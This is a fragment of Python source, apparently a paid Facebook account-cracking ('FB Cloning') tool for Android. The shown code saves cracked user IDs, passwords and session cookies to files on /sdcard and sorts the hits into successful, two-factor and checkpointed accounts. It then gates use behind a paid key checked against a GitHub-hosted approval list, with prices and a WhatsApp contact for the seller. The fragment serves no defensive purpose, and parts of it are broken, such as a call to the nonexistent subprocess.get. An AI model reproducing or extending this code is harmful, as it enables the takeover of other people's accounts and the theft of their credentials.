        with open('/sdcard/Hammadi_m4_OK.txt', 'a') as f:
            f.write(f"{ids}|{pas}\n")

        with open('/sdcard/Hammadi_iDs_COOKiE_M4.txt', 'a') as f:
            f.write(f"{ids}|{pas}|{coki}\n")
        oks(ids)
    if 'twf' in str(po.json()):
        print('\r\r\x1b[1;34m<[Hammadi-2F]> ' + ids + ' | ' + pas)
        with open('/sdcard/Hammadi-2F.txt', 'a') as f:
            f.write(f"{ids}|{pas}\n")
        twf(ids)
    if 'www.facebook.com' in po.json().get('error', {}).get('message', ''):
        print('\r\x1b[38;5;246m<[Hammadi-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
        with open('/sdcard/Hammadi-CP.txt', 'a') as f:
            f.write(f"{ids}|{pas}\n")
        cps(ids)

    loop += 1

except Exception as e:
  
    print(f"Error: {e}")


time.sleep(10)

Hammadi = ""  

def main_apv():
    global Hammadi  
    os.system('clear')
    print(logo)
    unique_id = str(uuid.uuid4())
    Hammadi = f'Hammadix6b7b5c{unique_id}85b8n9nfdi{unique_id}'
    print(logo)
    os.system('clear')
    print(logo)
    print('Your Key : \x1b[1;31m' + Hammadi)
    
    menu()  

def menu():  
    global Hammadi  
    while True:
        print('\x1b[1;34m═════════════════════════════════════════')
        system = requests.get('https://raw.githubusercontent.com/Hammadims16/Hammadi/main/approval.txt').text
        if Hammadi in system:
            print('Key is valid.')
            break
        
        print('\x1b[1;32m[\x1b[1;31m–\x1b[1;32m] THIS IS PAID TOOL [💸]')
       
        print('\x1b[1;32m[\x1b[1;31m–\x1b[1;32m] SEND YOUR KEY ADMIN [💸]')
        print('\x1b[1;34m═════════════════════════════════════════\x1b[1;97m')
        print('\x1b[1;32m[\x1b[1;31m–\x1b[1;32m] Notes: SH4MUL Tools Can buy in all countries!')
        print('\x1b[1;34m═════════════════════════════════════════\x1b[1;97m')
        print('\x1b[1;32m[\x1b[1;31m1\x1b[1;32m] 8$ \x1b[1;92mApproval For 1 month')
        print('\x1b[1;32m[\x1b[1;31m2\x1b[1;32m] 6$ \x1b[1;92mApproval For 15 days')
        print('\x1b[1;32m[\x1b[1;31m3\x1b[1;32m] 3$ \x1b[1;92mApproval For 7 days \x1b[1;37m')
        print('\x1b[1;34m═════════════════════════════════════════')

        choice = input('\x1b[1;32m[\x1b[1;31m–\x1b[1;32m] Select Buy Option : ')
        os.system('clear')
        print(logo)
        print(f'\x1b[1;32m[\x1b[1;31m–\x1b[1;32m] YOUR KEY : \x1b[31;1m{Hammadi}')
        print('\x1b[1;32m[\x1b[1;31m–\x1b[1;32m] Tools    : FB Cloning')
        print("\x1b[1;32m[\x1b[1;31m–\x1b[1;32m] Note: If You Are Free User Don't Come IB\x1b[0;0m")
        print('\x1b[1;32m[\x1b[1;31m1\x1b[1;32m] CRACK FILE  \n\x1b[1;32m[\x1b[1;31m2\x1b[1;32m] \x1b[1;37mExit Program')
        print('\x1b[1;34m═════════════════════════════════════════')

        url_wa = 'https://api.whatsapp.com/send?phone=+213558926136&text='
        choice = input(' \x1b[1;32m[\x1b[1;31m–\x1b[1;32m] Enter your choice  : ')
        tks = 'Hi Hammadi Sir, I Need To Buy Your Hammadi Tools Version V3/2.2 Premium Please Accept My Key To Premium\n\n Name : ' + choice + '\n Key : ' + Hammadi + '\n Buy Select : ' + choice
        subprocess.get(['am', 'start', url_wa + tks])
        time.sleep(2) 
        print('\x1b[1;34m═════════════════════════════════════════\nRun\x1b[1;32m[\x1b[1;31m-\x1b[1;32m] \x1b[1;37m again with permission from admin')

def check_internet_connection():
    try:
        response = requests.get('https://www.google.com', timeout=5)
        return response.status_code == 200
    except requests.ConnectionError:
        return False


if not check_internet_connection():
    print('\nNo internet connection ...')
    sys.exit()


main_apv()